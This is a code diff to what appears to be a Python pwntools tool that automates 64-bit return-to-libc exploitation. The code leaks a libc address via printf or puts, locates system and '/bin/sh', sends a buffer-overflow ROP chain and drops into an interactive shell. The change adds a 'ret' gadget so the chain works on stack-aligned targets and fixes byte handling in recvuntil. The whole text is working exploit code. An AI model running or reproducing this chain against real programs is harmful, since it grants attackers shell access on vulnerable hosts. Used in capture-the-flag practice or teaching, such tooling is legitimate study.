@@ -253,6 +253,7 @@ def ret2libc_64(fl_name,base_addr):
             extra_input = extra_input.replace(b"newline",b"\n")
         offset = int(input("Enter the offset to reach ret address:"))
         rop = ROP(e)
+        ret = rop.find_gadget(['ret'])[0]
         pop_rdi = rop.find_gadget(['pop rdi'])[0]
         if(type(pop_rdi) == None):
             log.info("Absence of pop rdi gadget!!!Exiting the program")
@@ -267,7 +268,7 @@ def ret2libc_64(fl_name,base_addr):
                 printf_leak = p64(e.got['printf']) + p64(e.plt['printf']) + p64(e.symbols['main'])
                 libc_leaker = offset_pusher + printf_leak
             r.sendline(libc_leaker)
-            a = r.recvuntil('\x7f')
+            a = r.recvuntil(b'\x7f')
             a = a[-6::1]
             a = u64(a.decode('latin-1').ljust(8,'\x00'))
             if(puts == True):
@@ -277,7 +278,7 @@ def ret2libc_64(fl_name,base_addr):
             libc_system = libc_base + libc.symbols['system']
             bin_sh = libc_base + (next(libc.search(b'/bin/sh')))
             offset_sender = extra_input + b'A' * offset
-            bomb=p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
+            bomb=p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(libc_system)
             exploit = offset_sender + bomb
             r.sendline(exploit)
             r.interactive()
@@ -315,7 +316,7 @@ def ret2libc_64(fl_name,base_addr):
                         sys.exit()
                     r.sendline(libc_leaker)
                     try:
-                        a = r.recvuntil('\x7f')
+                        a = r.recvuntil(b'\x7f')
                         a = a[-6::1]
                         a = u64(a.decode('latin-1').ljust(8,'\x00'))
                         if(puts == True):
@@ -355,7 +356,7 @@ def ret2libc_64(fl_name,base_addr):
                         sys.exit()
                     r.sendline(libc_leaker)
                     try:
-                        remote_unknown_libc_leak = r.recvuntil('\x7f')
+                        remote_unknown_libc_leak = r.recvuntil(b'\x7f')
                         remote_unknown_libc_leak = remote_unknown_libc_leak[-6::1]
                         remote_unknown_libc_leak = u64(remote_unknown_libc_leak.decode('latin-1').ljust(8,'\x00'))
                         libc_list = []
